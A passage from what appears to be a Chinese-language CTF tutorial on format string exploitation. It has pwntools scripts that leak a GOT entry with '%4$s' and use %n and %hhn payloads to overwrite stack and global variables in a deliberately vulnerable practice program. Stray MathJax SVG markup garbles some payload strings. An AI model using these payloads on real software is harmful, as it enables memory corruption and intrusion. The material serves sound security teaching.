&quot;print&quot;.<br>gef➤  x/x 0xffffcd20<br>0xffffcd20:	0x73243425<br>gef➤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gef➤  x/x 0x73243425<br>0x73243425:	Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure>

<p>显然0xffffcd20处所对应的格式化字符串所对应的变量值0x73243425并不能够被改程序访问，所以程序就自然崩溃了。</p>
<p>那么如果我们设置一个可访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p>
<p>首先，获取scanf@got的地址，如下</p>
<blockquote>
<p>这里之所以没有使用printf函数，是因为scanf函数会对0a，0b，0c，00等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure>

<p>下面我们利用pwntools构造payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got</span><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>

<p>其中，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(记得下断点)，可以看到我们的第四个参数确实指向我们的scanf的地址，这里输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"> → <span class="hljs-number">0xf7615670</span> &lt;printf+<span class="hljs-number">0</span>&gt;       call   <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">0</span>&gt; mov    eax, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb0c</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">3</span>&gt; ret<br>      <span class="hljs-number">0xf76ebb0d</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">0</span>&gt; mov    edx, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb10</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">3</span>&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[<span class="hljs-string">&#x27;0xffbbf8dc&#x27;</span>, <span class="hljs-string">&#x27;l8&#x27;</span>]<br><span class="hljs-number">8</span><br><span class="hljs-number">0xffbbf8dc</span>│+<span class="hljs-number">0x00</span>: <span class="hljs-number">0x080484ce</span>  →  &lt;main+<span class="hljs-number">99</span>&gt; add esp, <span class="hljs-number">0x10</span>	 ← $esp<br><span class="hljs-number">0xffbbf8e0</span>│+<span class="hljs-number">0x04</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e4</span>│+<span class="hljs-number">0x08</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e8</span>│+<span class="hljs-number">0x0c</span>: <span class="hljs-number">0x000000c2</span><br><span class="hljs-number">0xffbbf8ec</span>│+<span class="hljs-number">0x10</span>: <span class="hljs-number">0xf765c6bb</span>  →  &lt;handle_intel+<span class="hljs-number">107</span>&gt; add esp, <span class="hljs-number">0x10</span><br><span class="hljs-number">0xffbbf8f0</span>│+<span class="hljs-number">0x14</span>: <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp	 ← $eax<br><span class="hljs-number">0xffbbf8f4</span>│+<span class="hljs-number">0x18</span>: <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-number">0xffbbf8f8</span>│+<span class="hljs-number">0x1c</span>: <span class="hljs-number">0x00000000</span><br><br></code></pre></td></tr></table></figure>

<p>同时，在我们运行的terminal下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  leakmemory git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./leakmemory&#x27;</span>: pid <span class="hljs-number">65363</span><br>[*] <span class="hljs-string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;</span><br>    Arch:     i386-<span class="hljs-number">32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)<br><span class="hljs-number">0x804a014</span><br>\x14\xa0\x80%<span class="hljs-number">4</span>$s<br>[*] running <span class="hljs-keyword">in</span> new terminal: /usr/<span class="hljs-built_in">bin</span>/gdb -q  <span class="hljs-string">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot;</span> <span class="hljs-number">65363</span><br>[+] Waiting <span class="hljs-keyword">for</span> debugger: Done<br><span class="hljs-number">0xf76280c0</span><br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./leakmemory&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">65363</span>)<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactiv<br></code></pre></td></tr></table></figure>

<p>我们确实得到了scanf的地址。</p>
<p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[padding][addr]<br></code></pre></td></tr></table></figure>

<p>注意</p>
<blockquote>
<p>我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;\x0c\xa0\x04\x08%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 ← </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14│+0x18: &quot;\xa0\x04\x08%4$s&quot;<br>0xffffcd18│+0x1c: &quot;\x04\x08%4$s&quot;<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd10 <span class="hljs-string">&quot;\\x0c\\xa0\\x04\\x08%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  x/x 0xffffcd10<br>0xffffcd10:	0x6330785c<br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢?答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<br></code></pre></td></tr></table></figure>

<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p>
<p>这里我们给出如下的程序来介绍相应的部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>makefile在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure>

<p>其中…表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><h4 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h4><p>首先，我们自然是来想办法知道栈变量c的地址。由于目前几乎上所有的程序都开启了aslr保护，所以栈的地址一直在变，所以我们这里故意输出了c变量的地址。</p>
<h4 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h4><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;<br>0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000<br>0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28│+0x1c: &quot;%d%d&quot;	 ← $eax<br></code></pre></td></tr></table></figure>

<p>我们可以发现在0xffffcd14处存储着变量c的数值。继而，我们再确定格式化字符串’%d%d’的地址0xffffcd28相对于printf函数的格式化字符串参数0xffffcd10的偏移为0x18，即格式化字符串相当于printf函数的第7个参数，相当于格式化字符串的第6个参数。</p>
<h4 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h4><p>这样，第6个参数处的值就是存储变量c的地址，我们便可以利用%n的特征来修改c的值。payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[addr of c]%012d%6$n<br></code></pre></td></tr></table></figure>

<p>addr of c 的长度为4，故而我们得再输入12个字符才可以达到16个字符，以便于来修改c的值为16。</p>
<p>具体脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forc</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>    payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-comment">#gdb.attach(sh)</span><br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>܌��%012d%6$n<br>܌��-00000160648modified c.<br></code></pre></td></tr></table></figure>

<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以2为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个(4或8)字节。显然，无论之后如何输出，都只会比4大。</p>
<blockquote>
<p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
</blockquote>
<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把tag放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第6个参数。由于我们想要把2写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">aa%k$nxx<br></code></pre></td></tr></table></figure>

<p>此时对应的存储的格式化字符串已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p>
<p>利用ida可以得到a的地址为0x0804A024（由于a、b是已初始化的全局变量，因此不在堆栈中）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure>

<p>故而我们可以构造如下的利用代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fora</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    a_addr = <span class="hljs-number">0x0804A024</span><br>    payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>对应的结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta">aaaa$</span><span class="bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure>

<p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p>
<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text"> <br> hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<br></code></pre></td></tr></table></figure>

<p>所以说，我们可以利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节。这里，我们以单字节为例。</p>
<p>首先，我们还是要确定的是要覆盖的地址为多少，利用ida看一下，可以发现地址为0x0804A028。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure>

<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure>

<p>首先，由于我们的字符串的偏移为6，所以我们可以确定我们的payload基本是这个样子的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad2+'%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
